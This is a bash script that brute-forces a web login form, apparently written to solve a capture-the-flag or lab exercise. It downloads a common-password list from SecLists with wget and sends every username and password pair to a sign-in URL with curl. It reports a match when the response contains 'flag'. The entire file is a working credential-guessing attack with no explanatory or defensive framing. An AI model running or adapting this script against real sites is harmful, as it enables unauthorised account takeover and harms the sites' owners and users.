#!/bin/bash

if [ -z "${IPADDR}" ]; then
    echo "IPADDR env var is missing";
    exit 1;
fi

USER_FILE=users.txt
PSWD_FILE=passwords.txt
AMOUNT=1000

wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-$AMOUNT.txt" --output-document $PSWD_FILE

HEADER='=================================================================\n'

printf $HEADER;
printf "%-16s\t| %-16s\t| %-8s\t|\n" "user" "pass" "match";
printf $HEADER;

while IFS= read -r user
do
    while IFS= read -r pass
    do
        curl -s "http://$IPADDR/?page=signin&username=$user&password=$pass&Login=Login" | grep -o 'flag' &>/dev/null
        
        if [ $? -eq 0 ]; then
            printf "%-16s\t| %-16s\t| %-8c\t|\n" $user $pass 'o';
            if [ ! "$2" = "--all" ]; then
                printf $HEADER;
                exit 0;
            fi
        else
            printf "%-16s\t| %-16s\t| %-8c\t|\n" $user $pass 'x';
        fi
    done < $PSWD_FILE
done < $USER_FILE

printf $HEADER;

